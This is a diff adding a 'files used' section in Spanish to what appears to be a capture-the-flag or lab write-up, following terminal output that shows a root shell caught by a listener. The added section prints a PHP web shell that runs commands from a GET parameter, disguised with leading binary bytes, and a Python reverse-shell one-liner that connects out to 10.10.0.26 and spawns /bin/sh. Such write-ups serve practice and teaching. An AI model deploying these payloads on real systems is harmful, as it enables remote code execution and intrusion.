@@ -121,3 +121,17 @@ connect to [10.10.0.26] from (UNKNOWN) [10.0.30.187] 44170
 uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
+
+## Archivos utilizados 
+
+**xen.php**
+```php
+����
+<?php system($_GET['xen']);?>
+```
+
+**reverse.php**
+````python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.26",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+
